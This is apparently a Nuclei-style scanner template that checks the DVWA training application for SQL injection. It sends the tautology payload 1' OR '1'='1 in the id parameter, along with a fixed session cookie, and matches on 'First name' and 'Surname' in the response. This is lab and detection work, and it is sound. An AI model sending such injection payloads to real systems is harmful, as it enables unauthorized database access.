id: dvwa-sqli-check

info:
  name: DVWA SQL Injection Check
  author: van
  severity: high
  tags: sqli,dvwa

requests:
  - method: GET
    path:
      - "{{BaseURL}}/DVWA/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit"
    headers:
      Cookie: "PHPSESSID=12g9sj6gdknke4870ld4boosib; security=low"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "First name"
          - "Surname"
        condition: and
      - type: status
        status:
          - 200
